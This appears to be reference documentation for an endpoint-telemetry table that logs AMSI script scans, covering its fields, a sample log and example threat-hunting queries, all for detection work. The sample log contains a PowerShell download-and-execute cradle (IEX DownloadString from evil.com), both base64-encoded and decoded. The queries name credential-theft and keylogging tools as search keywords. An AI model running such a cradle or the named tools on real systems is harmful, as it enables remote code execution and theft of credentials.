## ScriptControlScanTelemetry Table: Script Execution Event

### 1. Table Name
**ScriptControlScanTelemetry**

---

### 2. Table Usage
This event is generated when a script is scanned by a script control engine, such as the Antimalware Scan Interface (AMSI) on Windows. It captures the content of scripts as they are being executed, which is invaluable for detecting fileless malware, obfuscated commands, and other malicious in-memory activities that might otherwise evade detection.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the process hosting the script engine (e.g., `powershell.exe`, `wscript.exe`). | Windows Only |
| ParentImageFileName | The full path to the parent process that spawned the script host. | Windows Only |
| CommandLine | The command line of the script host process. | Windows Only |
| HostProcessType | The type of process hosting the script engine. | Windows Only |
| ScriptingLanguageId | An identifier for the scripting language being used (e.g., PowerShell, VBScript, JScript). | Windows Only |
| ScriptContentSource | The source of the script content (e.g., from the command line, a file, or interactive session). | Windows Only |
| ScriptContent | The full content of the script that was scanned. | Windows Only |
| ScriptContentBytes | The raw byte content of the script that was scanned. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "ParentImageFileName": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwB0AGEAZwBlAHIALgBwAHMAMQAnACkA",
  "HostProcessType": "1",
  "ScriptingLanguageId": "1",
  "ScriptContentSource": "2",
  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/stager.ps1](http://evil.com/stager.ps1)')",
  "ScriptContentBytes": "494558284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f6576696c2e636f6d2f7374616765722e7073312729"
}
```

---

### 5. Example Queries

```xql
// Find all script control scan events
event_simpleName=ScriptControlScanTelemetry

// Hunt for scripts executed by PowerShell
event_simpleName=ScriptControlScanTelemetry ImageFileName="*\\powershell.exe"

// Find scripts where the parent process was something other than explorer.exe or cmd.exe
event_simpleName=ScriptControlScanTelemetry ParentImageFileName!="C:\\Windows\\explorer.exe" ParentImageFileName!="C:\\Windows\\System32\\cmd.exe"

// Search for suspicious keywords within the script content
event_simpleName=ScriptControlScanTelemetry ScriptContent="*DownloadString*" OR ScriptContent="*Invoke-Mimikatz*" OR ScriptContent="*Get-Keystrokes*"

// Find scripts that were passed via the command line (often obfuscated)
event_simpleName=ScriptControlScanTelemetry ScriptContentSource=2

// Look for JScript or VBScript execution, which is less common for legitimate admin tasks
event_simpleName=ScriptControlScanTelemetry ScriptingLanguageId IN (2, 3)
```
---
